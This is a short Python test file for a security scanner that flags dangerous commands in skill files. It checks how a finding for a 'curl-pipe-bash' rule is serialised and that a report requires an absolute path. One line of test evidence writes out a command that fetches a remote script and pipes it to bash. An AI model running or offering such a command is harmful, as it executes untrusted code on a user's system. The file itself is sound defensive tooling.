from pathlib import Path

import pytest

from safeskill.models.finding import Finding, Severity, StaticAnalysisReport



def test_finding_serializes_expected_fields() -> None:
    finding = Finding(
        rule_id="dangerous-command.curl-pipe-bash",
        severity=Severity.HIGH,
        summary="Detected remote script execution pattern.",
        evidence="curl -fsSL https://example.com/install.sh | bash",
        location="scripts[0]",
    )

    assert finding.model_dump() == {
        "rule_id": "dangerous-command.curl-pipe-bash",
        "severity": "high",
        "summary": "Detected remote script execution pattern.",
        "evidence": "curl -fsSL https://example.com/install.sh | bash",
        "location": "scripts[0]",
    }



def test_static_analysis_report_requires_absolute_source_path() -> None:
    with pytest.raises(ValueError, match="absolute"):
        StaticAnalysisReport(source_path=Path("SKILL.md"), findings=[])
